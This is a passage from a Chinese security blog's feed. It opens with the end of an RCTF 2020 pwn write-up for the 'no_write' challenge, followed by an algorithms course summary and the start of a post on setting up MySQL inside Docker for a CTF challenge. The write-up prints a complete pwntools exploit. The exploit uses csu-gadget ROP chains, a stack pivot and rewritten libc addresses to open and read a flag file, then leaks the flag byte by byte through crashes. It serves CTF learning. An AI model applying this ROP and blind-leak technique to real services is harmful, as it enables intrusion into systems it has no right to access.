class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">'./no_write'</span>)</span><br><span class="line">pppppp_ret = <span class="number">0x00000000040076A</span></span><br><span class="line">read_got = <span class="number">0x000000000600FD8</span></span><br><span class="line">leave_tet = <span class="number">0x00000000040070B</span></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">0x18</span>+p64(pppppp_ret)+ret_csu(read_got,<span class="number">0</span>,<span class="number">0x601350</span>,<span class="number">0x400</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0x6013f8</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(leave_tet)  <span class="comment"># move stack to 0x601400</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><h3 id="利用-libc-start-main"><a href="#利用-libc-start-main" class="headerlink" title="利用__libc_start_main"></a>利用__libc_start_main</h3><p>我们的第二次输入需要使用<code>__libc_start_main</code>调用<code>read_n</code>函数，把函数地址pop进<code>rdi</code>中，剩下的<code>rsi=0x601350</code>和<code>rdx=0x400</code>是可以直接沿用的值，调用<code>__libc_start_main</code>可以让栈上出现libc相关的地址，这样再利用gadget修改这些地址就可以得到我们想要的内容。我们要一位一位的爆破，肯定需要用于比较的指令，随后要使用系统调用肯定需要<code>syscall ret</code>，刚好在栈上残存了两个libc地址可以用。而怎么修改这两个地址？需要用到一个特殊的gadget。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005E8                 add     [rbp-3Dh], ebx</span><br><span class="line">.text:00000000004005EB                 nop     dword ptr [rax+rax+00h]</span><br><span class="line">.text:00000000004005F0                 rep retn</span><br></pre></td></tr></table></figure><p>这里的<code>rbp</code>和<code>ebx</code>是可以通过之前的<code>csu_init</code>的gadget控制，所以我们可以用这个修改栈上的地址变成我们可以使用的gadget。</p><p>我这里用于比较的函数是strncmp中的<code>__strncmp_sse42</code>，我们计算offset，让<code>ebx</code>为负数就会变成减。同时这里是要不断调试栈帧的，前面有一定长度的填充，要让<code>__libc_start_main</code>的结束返回地址放在<code>0x601350</code>上，这样我们第三次输入才能直接覆盖返回地址进行rop。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">call_libc_start_main = <span class="number">0x000000000400544</span></span><br><span class="line">readn = <span class="number">0x0000000004006BF</span></span><br><span class="line">p_rdi = <span class="number">0x0000000000400773</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"\x00"</span>*(<span class="number">0x100</span><span class="number">-0x50</span>)  <span class="comment"># 0x601400</span></span><br><span class="line">payload += p64(p_rdi)+p64(readn)+p64(call_libc_start_main)  <span class="comment"># also has rsi=0x601350 rdx=0x400</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x400</span>,<span class="string">'\x00'</span>)</span><br></pre></td></tr></table></figure><h3 id="逐位爆破flag"><a href="#逐位爆破flag" class="headerlink" title="逐位爆破flag"></a>逐位爆破flag</h3><p>在<code>__libc_start_main</code>调用完之后，用gadget修改栈上的libc地址为我们想要的gadget，随后开始用这些gadget执行open和read flag文件的操作，需要注意的一点，由于open操作没有对应的got表，所以需要系统调用才能使用，我们可以先调用一次read函数读入两个字节，让<code>rax=2</code>再用<code>syscall ret</code>调用open打开flag文件。读入flag到某个地址中，再读入我们的输入到<code>0x601fff</code>，这样比较的时候如果字符相同就会继续比较下一位，这样就溢出了程序可以控制的地址，引发错误，通过这种报错的方法一位一位爆破比较。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">offset = <span class="number">0x267870</span> <span class="comment">#initial - __strncmp_sse42</span></span><br><span class="line">payload = p64(pppppp_ret)+p64((<span class="number">0x100000000</span>-offset)&amp;<span class="number">0xffffffff</span>)</span><br><span class="line">payload += p64(<span class="number">0x601318</span>+<span class="number">0x3D</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x4005E8</span>)  <span class="comment"># add [rbp-3Dh], ebx</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x31dcb3</span> <span class="comment"># __exit_funcs_lock - syscall</span></span><br><span class="line">payload += p64(pppppp_ret)+p64((<span class="number">0x100000000</span>-offset)&amp;<span class="number">0xffffffff</span>)</span><br><span class="line">payload += p64(<span class="number">0x601310</span>+<span class="number">0x3D</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x4005E8</span>)</span><br><span class="line">payload += p64(pppppp_ret)+ret_csu(read_got,<span class="number">0</span>,<span class="number">0x601800</span>,<span class="number">2</span>)  <span class="comment"># make rax=2</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">payload += p64(pppppp_ret)+ret_csu(<span class="number">0x601310</span>,<span class="number">0x601350</span>+<span class="number">0x3f8</span>,<span class="number">0</span>,<span class="number">0</span>) <span class="comment">#open flag</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">payload += p64(pppppp_ret)+ret_csu(read_got,<span class="number">3</span>,<span class="number">0x601800</span>,<span class="number">0x100</span>)   <span class="comment">#read flag</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">payload += p64(pppppp_ret)+ret_csu(read_got,<span class="number">0</span>,<span class="number">0x601ff8</span>,<span class="number">8</span>)</span><br><span class="line"><span class="comment"># now we can cmp the flag one_by_one</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">6</span> </span><br><span class="line">payload += p64(pppppp_ret)+ret_csu(<span class="number">0x601318</span>,<span class="number">0x601800</span>+i,<span class="number">0x601fff</span>,<span class="number">2</span>)  <span class="comment"># cmp flag</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">payload += p64(p_rdi)+p64(<span class="number">0x601700</span>)+p64(p_rsi_r15)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(readn)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x3f8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += <span class="string">"flag\x00\x00\x00\x00"</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">p.send(<span class="string">"dd"</span>+<span class="string">"d"</span>*<span class="number">7</span>+j)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.recv(timeout=<span class="number">0.5</span>)</span><br><span class="line">p.send(<span class="string">"A"</span>*<span class="number">0x100</span>)</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>同样是一道非常有趣的题目，学到pwn中的一些盲注思路，和SQL注入类似都有基于报错的和基于延时的方法。以及利用<code>__libc_start_main</code>让libc地址出现在栈空间上，再利用gadget修改成我们想要的gadget完成整体的利用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret_csu</span><span class="params">(func,arg1=<span class="number">0</span>,arg2=<span class="number">0</span>,arg3=<span class="number">0</span>)</span>:</span></span><br><span class="line">    payload = <span class="string">''</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(func)</span><br><span class="line">    payload += p64(arg1)+p64(arg2)+p64(arg3)+p64(<span class="number">0x000000000400750</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(host,port=<span class="number">2333</span>)</span>:</span></span><br><span class="line">    <span class="comment"># global p</span></span><br><span class="line">    <span class="comment"># if host:</span></span><br><span class="line">        <span class="comment"># p = remote(host,port)</span></span><br><span class="line">    <span class="comment"># else:</span></span><br><span class="line">        <span class="comment"># p = process("./no_write")</span></span><br><span class="line">        <span class="comment"># gdb.attach(p,"b* 0x0000000004006E6")</span></span><br><span class="line">    <span class="comment"># 0x0000000000400773 : pop rdi ; ret</span></span><br><span class="line">    <span class="comment"># 0x0000000000400771 : pop rsi ; pop r15 ; ret</span></span><br><span class="line">    <span class="comment"># .text:0000000000400544                 call    cs:__libc_start_main_ptr</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># .text:00000000004005E8                 add     [rbp-3Dh], ebx</span></span><br><span class="line">    <span class="comment"># .text:00000000004005EB                 nop     dword ptr [rax+rax+00h]</span></span><br><span class="line">    <span class="comment"># .text:00000000004005F0                 rep retn</span></span><br><span class="line">    charset = <span class="string">'&#125;&#123;_'</span>+string.digits+string.letters</span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x30</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># p = remote(host,6000)</span></span><br><span class="line">                p = process(<span class="string">'./no_write'</span>)</span><br><span class="line">                pppppp_ret = <span class="number">0x00000000040076A</span></span><br><span class="line">                read_got = <span class="number">0x000000000600FD8</span></span><br><span class="line">                call_libc_start_main = <span class="number">0x000000000400544</span></span><br><span class="line">                p_rdi = <span class="number">0x0000000000400773</span></span><br><span class="line">                p_rsi_r15 = <span class="number">0x0000000000400771</span></span><br><span class="line">                <span class="comment"># 03:0018|  0x601318 -&gt; 0x7f6352629d80 (initial) &lt;-0x0</span></span><br><span class="line">                offset = <span class="number">0x267870</span> <span class="comment">#initial - __strncmp_sse42</span></span><br><span class="line">                readn = <span class="number">0x0000000004006BF</span></span><br><span class="line">                leave_tet = <span class="number">0x00000000040070B</span></span><br><span class="line">                payload = <span class="string">"A"</span>*<span class="number">0x18</span>+p64(pppppp_ret)+ret_csu(read_got,<span class="number">0</span>,<span class="number">0x601350</span>,<span class="number">0x400</span>)  </span><br><span class="line">                payload += p64(<span class="number">0</span>)+p64(<span class="number">0x6013f8</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(leave_tet)  <span class="comment"># move stack to 0x601400</span></span><br><span class="line">                payload = payload.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>)</span><br><span class="line">                p.send(payload)</span><br><span class="line">                sleep(<span class="number">0.3</span>)</span><br><span class="line">                payload = <span class="string">"\x00"</span>*(<span class="number">0x100</span><span class="number">-0x50</span>)  <span class="comment"># 0x601400</span></span><br><span class="line">                payload += p64(p_rdi)+p64(readn)+p64(call_libc_start_main)  <span class="comment"># also has rsi=0x601350 rdx=0x400</span></span><br><span class="line">                payload = payload.ljust(<span class="number">0x400</span>,<span class="string">'\x00'</span>)</span><br><span class="line">                <span class="comment"># pause()</span></span><br><span class="line">                p.send(payload)</span><br><span class="line">                <span class="comment"># pause()</span></span><br><span class="line">                sleep(<span class="number">0.3</span>)</span><br><span class="line">                <span class="comment"># 0x601318</span></span><br><span class="line">                payload = p64(pppppp_ret)+p64((<span class="number">0x100000000</span>-offset)&amp;<span class="number">0xffffffff</span>)  </span><br><span class="line">                payload += p64(<span class="number">0x601318</span>+<span class="number">0x3D</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x4005E8</span>)  <span class="comment"># add [rbp-3Dh], ebx</span></span><br><span class="line">                <span class="comment"># 0x00000000000d2975: syscall; ret;</span></span><br><span class="line">                <span class="comment"># 02:0010|            0x601310 -&gt; 0x7f61d00d8628 (__exit_funcs_lock) &lt;- 0x0</span></span><br><span class="line">                offset = <span class="number">0x31dcb3</span> <span class="comment"># __exit_funcs_lock - syscall</span></span><br><span class="line">                payload += p64(pppppp_ret)+p64((<span class="number">0x100000000</span>-offset)&amp;<span class="number">0xffffffff</span>)</span><br><span class="line">                payload += p64(<span class="number">0x601310</span>+<span class="number">0x3D</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x4005E8</span>)</span><br><span class="line">                payload += p64(pppppp_ret)+ret_csu(read_got,<span class="number">0</span>,<span class="number">0x601800</span>,<span class="number">2</span>)  <span class="comment"># make rax=2</span></span><br><span class="line">                payload += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">                payload += p64(pppppp_ret)+ret_csu(<span class="number">0x601310</span>,<span class="number">0x601350</span>+<span class="number">0x3f8</span>,<span class="number">0</span>,<span class="number">0</span>) <span class="comment">#open flag</span></span><br><span class="line">                payload += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">                payload += p64(pppppp_ret)+ret_csu(read_got,<span class="number">3</span>,<span class="number">0x601800</span>,<span class="number">0x100</span>)   <span class="comment">#read flag</span></span><br><span class="line">                payload += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">                payload += p64(pppppp_ret)+ret_csu(read_got,<span class="number">0</span>,<span class="number">0x601ff8</span>,<span class="number">8</span>)</span><br><span class="line">                <span class="comment"># now we can cmp the flag one_by_one</span></span><br><span class="line">                payload += p64(<span class="number">0</span>)*<span class="number">6</span> </span><br><span class="line">                payload += p64(pppppp_ret)+ret_csu(<span class="number">0x601318</span>,<span class="number">0x601800</span>+i,<span class="number">0x601fff</span>,<span class="number">2</span>)  <span class="comment"># cmp flag</span></span><br><span class="line">                payload += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">                <span class="comment"># for _ in range(4):</span></span><br><span class="line">                <span class="comment">#     payload += p64(p_rdi)+p64(0x601700)+p64(p_rsi_r15)+p64(0x100)+p64(0)+p64(readn)</span></span><br><span class="line">                payload += p64(p_rdi)+p64(<span class="number">0x601700</span>)+p64(p_rsi_r15)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(readn)</span><br><span class="line"></span><br><span class="line">                payload = payload.ljust(<span class="number">0x3f8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">                payload += <span class="string">"flag\x00\x00\x00\x00"</span></span><br><span class="line">                p.send(payload)</span><br><span class="line">                <span class="comment"># pause()</span></span><br><span class="line">                sleep(<span class="number">0.3</span>)</span><br><span class="line">                p.send(<span class="string">"dd"</span>+<span class="string">"d"</span>*<span class="number">7</span>+j)</span><br><span class="line">                <span class="comment"># pause()</span></span><br><span class="line">                sleep(<span class="number">0.5</span>)</span><br><span class="line">                p.recv(timeout=<span class="number">0.5</span>)</span><br><span class="line">                p.send(<span class="string">"A"</span>*<span class="number">0x100</span>)</span><br><span class="line">                <span class="comment"># pause()</span></span><br><span class="line">                <span class="comment"># info(j)</span></span><br><span class="line">                p.close()</span><br><span class="line">                <span class="comment"># p.interactive()</span></span><br><span class="line">            <span class="keyword">except</span> EOFError:</span><br><span class="line">                flag += j</span><br><span class="line">                info(flag)</span><br><span class="line">                print(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">if</span>(j == <span class="string">'&#125;'</span>):</span><br><span class="line">                    exit()</span><br><span class="line">                p.close()</span><br><span class="line">                <span class="comment"># pause()</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line">    main(args[<span class="string">"REMOTE"</span>])</span><br></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.rois.io/2020/rctf-2020-official-writeup/" target="_blank" rel="noopener">https://blog.rois.io/2020/rctf-2020-official-writeup/</a></p><p><a href="https://www.jianshu.com/p/be6bbc251919" target="_blank" rel="noopener">https://www.jianshu.com/p/be6bbc251919</a></p><p><a href="https://mp.weixin.qq.com/s/Ov5PXoh-gHYYrOCA9TNWGw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Ov5PXoh-gHYYrOCA9TNWGw</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;博客长草严重，上半年摸鱼太久。最近趁着有空开始复现之前的一些题目，这次做了2020RCTF的几道pwn题，本来还想着把MIPS那道题做出来再发，结果发现MIPS的调试还有很多问题，所以就先发常规一点的题。&lt;/p&gt;
&lt;h2 id=&quot;note&quot;&gt;&lt;a href=&quot;#note&quot; 
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
      <category term="ROP" scheme="https://hurricane618.me/tags/ROP/"/>
    
      <category term="heap" scheme="https://hurricane618.me/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>算法课程总结</title>
    <link href="https://hurricane618.me/2020/01/13/algorithm-course-summary/"/>
    <id>https://hurricane618.me/2020/01/13/algorithm-course-summary/</id>
    <published>2020-01-13T11:00:36.000Z</published>
    <updated>2020-01-13T11:03:07.533Z</updated>
    
    <content type="html"><![CDATA[<p>一开始只是抱着开阔视野的心态来的，想着算法是IT行业哪里都会用到的东西，学完之后觉得卜老师不愧是教了13年的老师，很多地方都很受益，虽然不是专门做算法的，其中的很多思想都对以后的工作有一定启发。</p><h2 id="观察问题的角度"><a href="#观察问题的角度" class="headerlink" title="观察问题的角度"></a>观察问题的角度</h2><h3 id="问题的可分解性"><a href="#问题的可分解性" class="headerlink" title="问题的可分解性"></a>问题的可分解性</h3><p>想要解决一个复杂的问题，我们首先从这个问题最简单的实例入手，这个最简单的实例能用什么方法解决？复杂的问题能不能分解成简单的问题？</p><h3 id="可行性解的形式以及解之间的变换关系"><a href="#可行性解的形式以及解之间的变换关系" class="headerlink" title="可行性解的形式以及解之间的变换关系"></a>可行性解的形式以及解之间的变换关系</h3><p>问题的可行解的形式是什么？可行解的总数有多少？可行解能否一步一步的逐步构建出来？我们能否对一个可行解施加小幅度的扰动，将它变成另外一个可行解？</p><h3 id="类似的问题"><a href="#类似的问题" class="headerlink" title="类似的问题"></a>类似的问题</h3><p>和给定的问题类似的问题有哪些？解决类似问题的算法能够直接运用于解决当前的问题？如果不能，那么是什么因素造成了妨碍？能否想到方法消除这些妨碍的因素？</p><h3 id="现有算法的不足"><a href="#现有算法的不足" class="headerlink" title="现有算法的不足"></a>现有算法的不足</h3><p>现有的算法有哪些不足？比如：是否存在冗余计算？如果存在的话，能否想到办法消除冗余？</p><h2 id="解决问题的思路"><a href="#解决问题的思路" class="headerlink" title="解决问题的思路"></a>解决问题的思路</h2><h3 id="基于对问题结构观察的算法设计"><a href="#基于对问题结构观察的算法设计" class="headerlink" title="基于对问题结构观察的算法设计"></a>基于对问题结构观察的算法设计</h3><p>在解决一个问题的时候，需要分析这个问题是怎么组成的，能够怎么抽象。而不是直接一个一个算法去套，这种硬套的方法就是碰运气，如果运气好就能用，运气不好就不行了。</p><h3 id="从最简单的例子做起"><a href="#从最简单的例子做起" class="headerlink" title="从最简单的例子做起"></a>从最简单的例子做起</h3><p>做复杂的问题很多时候会很懵逼，这个时候就需要从最简单的情况考虑问题比如n=2，n=3的时候，这样会更加容易上手。</p><h3 id="试图把大问题分解成小问题"><a href="#试图把大问题分解成小问题" class="headerlink" title="试图把大问题分解成小问题"></a>试图把大问题分解成小问题</h3><p>如果从简单问题的观察中，发现问题是可以分解的，那么我们可以尝试把大问题分解成小问题。</p><h3 id="试图从粗糙开始逐步改善"><a href="#试图从粗糙开始逐步改善" class="headerlink" title="试图从粗糙开始逐步改善"></a>试图从粗糙开始逐步改善</h3><p>如果从简单问题的观察中，发现问题是不能分解的，那么就从最笨最简陋的方法开始逐步优化。</p><h3 id="试图枚举所有的解，但是要用聪明的方法"><a href="#试图枚举所有的解，但是要用聪明的方法" class="headerlink" title="试图枚举所有的解，但是要用聪明的方法"></a>试图枚举所有的解，但是要用聪明的方法</h3><p>如果问题的解是一种集合，那么可以尝试枚举所有的解。在遍历的过程中要学会剪枝，不要暴力检索。</p><h3 id="难以优化的函数使用下界或者上界函数代替"><a href="#难以优化的函数使用下界或者上界函数代替" class="headerlink" title="难以优化的函数使用下界或者上界函数代替"></a>难以优化的函数使用下界或者上界函数代替</h3><p>例如：EM，Lagrangian，log barrier<br>$$<br>\large \begin{matrix}<br>min &amp; f(x)\<br>s.t. &amp; h(x) \geq 0<br>\end{matrix}<br>$$<br>$f(x)$难以计算的时候，使用拉格朗日乘子，$L(x,\lambda)=f(x)-\lambda h(x)$，如果$\lambda \geq 0$那么必有$f(x) \geq L(x,\lambda)$。</p><h3 id="复杂操作的潜力一定要挖掘干净"><a href="#复杂操作的潜力一定要挖掘干净" class="headerlink" title="复杂操作的潜力一定要挖掘干净"></a>复杂操作的潜力一定要挖掘干净</h3><p>例如：Dinic’s algorithm</p><p>一次BFS需要O(m)的时间，只用于增广一条<code>s-&gt;t</code>路。而把一条路改成所有路就能最大程度的增加效率。（这个算法其实我没听懂23333）</p><h3 id="求同时满足多个条件的解，分步满足，并利用对称性"><a href="#求同时满足多个条件的解，分步满足，并利用对称性" class="headerlink" title="求同时满足多个条件的解，分步满足，并利用对称性"></a>求同时满足多个条件的解，分步满足，并利用对称性</h3><p>在我们解决LP问题的时候，通常需要满足多个条件，那么我们可以这样来解决问题，先满足其中的大部分条件，然后再循环逼近另外的条件，或者降低不满足其他条件的程度。</p><h3 id="想想对偶"><a href="#想想对偶" class="headerlink" title="想想对偶"></a>想想对偶</h3><p>依旧是在解决LP问题时候的一种策略，如果单纯的替换变量不好做，那么可以试试对偶来解决问题。</p><h3 id="Random-sampling"><a href="#Random-sampling" class="headerlink" title="Random sampling"></a>Random sampling</h3><p>分治思想中的快排，在选取切分点的时候不会去选择最优的pivot而是随机选择一个。</p><h3 id="Scaling-number"><a href="#Scaling-number" class="headerlink" title="Scaling number"></a>Scaling number</h3><p>在有很多数字计算的问题中，可以采用放缩的方法降低计算量。比如所有的数字都除一个数，如果数字小于1就变成0。</p><h3 id="从最好-gt-足够好"><a href="#从最好-gt-足够好" class="headerlink" title="从最好 =&gt; 足够好"></a>从最好 =&gt; 足够好</h3><p>这个思想和random sampling有点类似，不一定要最好的分支点（命中概率$\frac{1}{n}$），只要足够好就行（命中概率$\frac{1}{2}$），如果要对快排再次改进，就可以让选择pivot的时候限制在一个较好的区间中，避免pivot在最边上的情况。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>推荐了两本书Polya的《怎样解题》和费曼的《物理学讲义》。一本书是对解题思维过程的理解，另外一本书是著名的物理学家费曼的物理讲义，想要了解什么书才是好书，把科学的概念和生活联系在一起，而不是枯燥的阐述和推理。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一开始只是抱着开阔视野的心态来的，想着算法是IT行业哪里都会用到的东西，学完之后觉得卜老师不愧是教了13年的老师，很多地方都很受益，虽然不是专门做算法的，其中的很多思想都对以后的工作有一定启发。&lt;/p&gt;
&lt;h2 id=&quot;观察问题的角度&quot;&gt;&lt;a href=&quot;#观察问题的角度&quot;
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="算法" scheme="https://hurricane618.me/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>Docker中的Mysql配置问题处理与思考</title>
    <link href="https://hurricane618.me/2019/11/27/docker-mysql-problem-check/"/>
    <id>https://hurricane618.me/2019/11/27/docker-mysql-problem-check/</id>
    <published>2019-11-27T15:07:33.000Z</published>
    <updated>2019-11-27T16:01:02.987Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下，我在docker容器中配置Mysql时遇到的坑，以及处理过程中学到的知识。</p><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>最近作业量多，任务重结果还是被点名出题（哭唧唧），没办法只能硬着头皮上。有了出题思路之后，和<code>@wh1t3Pig</code>交流之后得知需要使用<code>docker-compose</code>来布置出题环境。啥？卧槽？不能手动布置吗？算了，就当做是对我的考验。所以我开开心心的写好源文件之后，开始准备布置环境，那么到底是直接拉个Mysql，还是直接在容器内部装？在内部装又有各种问题。。。这里就把这些坑记录下来造福后人，同时也有一定的分析。</p><h2 id="web-server-mysql-or-in-one-container？"><a href="#web-server-mysql-or-in-one-container？" class="headerlink" title="web server+mysql or in one container？"></a>web server+mysql or in one container？</h2><p>在参考多个知名项目和比赛题目的<code>Dockerfile</code>，<code>docker-compose.yml</code>，<code>start.sh</code>之后，毅然决定使用把服务全部装进一个容器的思路。</p><p>为什么？考虑有以下几点：</p><ol><li>我出的题目是SQLi，需要提前在数据库中插入数据，然而使用直接拉一个Mysql的方式，非常不方便，如果要插入数据必须要再写一个针对Mysql的<code>Dockerfile</code>，那这样还不如直接放在一起。</li><li>这道题的数据库和其他题目不共享，单独拉一个的意义不大。</li><li>如果以后要多节点部署这种题目，数据库独立的话能避免队伍之间搅屎。</li></ol><p>注：要是有师傅能有更好的解决方案，欢迎交流。</p><h2 id="Mysql的安装交互问题"><a href="#Mysql的安装交互问题" class="headerlink" title="Mysql的安装交互问题"></a>Mysql的安装交互问题</h2><p>那么采用了服务装进一个容器里面之后，发现了另外一个问题，<code>apt-get install mysql-server</code>这个安装是需要交互的，途中要求你设置root的密码。这个没有办法用<code>-y</code>选项回避掉。一顿搜索之后，在stackoverflow中看到可以使用一个环境变量<code>DEBIAN_FRONTEND=noninteractive</code>来跳过交互。</p><p>这样我们在<code>Dockerfile</code>中</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ENV</span> DEBIAN_FRONTEND=noninteractive</span><br><span class="line"><span class="keyword">RUN</span> apt-get update &amp;&amp; apt-get install -y mysql-server &amp;&amp; apt-get clean</span><br></pre></td></tr></table></figure><p>就可以完美解决交互问题。</p><h2 id="php中的mysql扩展安装顺序问题"><a href="#php中的mysql扩展安装顺序问题" class="headerlink" title="php中的mysql扩展安装顺序问题"></a>php中的mysql扩展安装顺序问题</h2><p>题目使用的是mysql扩展，自带的php没有，这个时候需要<code>docker-php-ext-install mysql</code>。但是事故发生了，我在手动操作的时候是可以成功的，但是自动化的时候连接报错<code>No such file or 